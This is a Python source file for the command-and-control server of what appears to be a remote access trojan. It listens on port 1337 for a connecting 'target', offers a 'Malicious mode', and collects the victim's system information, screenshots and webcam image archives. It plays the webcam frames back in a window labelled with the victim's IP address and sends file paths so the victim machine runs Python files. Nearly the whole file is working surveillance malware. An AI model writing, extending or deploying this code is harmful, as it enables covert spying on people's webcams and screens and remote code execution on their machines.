import os
import random
import socket
import string
import sys
import time
from zipfile import ZipFile

import cv2
from mss import mss

class Server:
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size

        self.connections = []  # connections list
        self.info = ""  # info about target
        self.recvcounter = 0  # counter for received files
        self.sscount =  0
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # try to update buffer size
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for big files
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            print(str(sys.getsizeof(full)) + " " + str(size))
            if sys.getsizeof(full) >= size:
                print("escaped")
                break
            else:
                print(str(sys.getsizeof(full)) + " " + str(size))
            print("Waiting: ")
            recvfile = (self.client_socket.recv(buff))
            print("received")
            #print(str(recvfile.decode()) + " HERE  ")
            full += recvfile

        return full

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(2)

        self.acceptConnections()

    def acceptConnections(self):
        print(self.IP)
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)
        # # safemode

        mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(mode)
        if mode == "2":
            print("Virtuous mode")
            self.connectionconfirm()
        else:
            print("Malicious mode")

        self.progress()
        # # print("hello worlds")

    def generatekey(self):
        # Creates a password containing uppercase, lowercase, numerical digits and punctuation.
        letters = (string.ascii_letters + string.digits + string.punctuation)
        code = ''.join(random.choices(letters, k=10))
        # print("Key =  " + code)
        return code

    def connectionconfirm(self):
        key = self.generatekey()
        print("Key =  " + key)

        self.client_socket.send(key.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if response == "MISMATCH":
            self.close()

    def progress(self):
        print("This was 100% successful")
        input("Start")
        while True:
            #self.getTargetInfo()
            #self.screenshot()
            #self.rec200vid()
            self.webcamsend()
            input("Play? ")
            self.test2()
            input("Complete")
            pass

    def disconn(self):
        command = "disconnect"
        self.client_socket.send(command.encode("utf-8"))
        print("*** Killed")

    def getTargetInfo(self):
        print("here")
        #command = "--ginfo"
        #self.client_socket.send(command.encode("utf-8"))

        info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print("info = "+  info)
        more = self.client_socket.recv(self.BUFFER_SIZE)
        print("more = "+str(more))
        ##### EVEN MORE IS LARGER THAN BUFFER SIZE ######
        emsize = self.client_socket.recv(self.BUFFER_SIZE).decode("UTF-8")
        print("emsize =" + str(emsize))
        if int(emsize) >= self.BUFFER_SIZE:
            print("bigboi")
            buff = self.updateBuffer(emsize)
            print("buffer = " + str(buff))
            evenmore = self.saveBigFile(int(emsize), buff)
            print("evenmore =" +  str(evenmore))
        else:
            evenmore = self.client_socket.recv(self.BUFFER_SIZE)
        moresysinfo = input("Would you like to see more?: ")
        if moresysinfo == "yes":
            print(more.decode())

        print(moresysinfo + "\n\n")
        """ writing additional information in a file """

        with open('../receivedfile/info.txt', 'wb+') as f, open('./logs/moreinfoS.txt', 'wb+') as m:
            f.write(more)
            m.write(evenmore)
            print("DONE")
        #with open('./logs/moreinfoS.txt', "rb+") as m:
            #print(m.read())
        print("\n# OS:" + info)
        print("# IP:" + self.address[0])
        print("*** Check info.txt for more details on the target ***")
        print("**** Check moreinfo.txt for even more details on the target ****")

        return info

    def exePy(self):
        #command = "-exePy"
        #self.client_socket.send(command.encode())
        filename = input("[+] Enter the full filepath: ")
        self.client_socket.send(filename.encode())
        print("FilePath Sent")
        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print("*** " + response + " *** ")

    def screenshot(self):
        #command = "-SS"
        #self.client_socket.send(command.encode())

        # recv file size
        recvsize = self.client_socket.recv(self.BUFFER_SIZE).decode()
        time.sleep(0.1)

        # updating buffer
        buff = self.updateBuffer(recvsize)

        # getting the file
        print("*** Saving screenshot ***")
        fullscreen = self.saveBigFile(int(recvsize), buff)

        # saving the file
        with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen:
            screen.write(fullscreen)
        print("*** File saved ***")

    def WCplayback(self):

        #path = f'../receivedfile/webcam{str(self.recvcounter - 1)}'
        path = f'../receivedfile/webcamS'
        path2 = f'../receivedfile/webcamS/logs/Video'
        print(str(path))
        with ZipFile(path + ".zip", 'r') as zip_ref:
            zip_ref.extractall(path)

        cv2.namedWindow(f"{self.address[0]}'s Webcam")
        with os.scandir(path2) as entries:
            for entry in entries:
                print(entry.name)
                p = str(path2) + str("/") + str(entry.name)
                x = cv2.imread(p)
                cv2.imshow(f"{self.address[0]}'s Webcam", x)
                cv2.waitKey(0)
        cv2.destroyWindow(f"{self.address[0]}'s Webcam")

    def webcamsend(self):
        #command = "-Fsend"
        #self.client_socket.send(command.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE)
        if response.decode("utf-8") == "Success":
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)
            print("Size  = " + size)
            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got small file ***")

                with open(f'../receivedfile/webcamS.zip', 'wb+') as output:
                    print("Opened file s ")
                    output.write(archive)

                print("*** File saved ***")
                self.recvcounter += 1
            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got large file *** ")
                with open(f'../receivedfile/webcamS.zip', 'wb+') as output:
                    print("Opened file L ")
                    output.write(fullarchive)

                print("*** File saved ***")
                self.recvcounter += 1
        else:
            print(response.decode("utf-8"))


def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    # banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = 1337  # int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")
    # just sending a message, for demonstration purposes
    message = "Hello and Welcome".encode()
    # server.client_socket.send(message)


if __name__ == "__main__":
    main()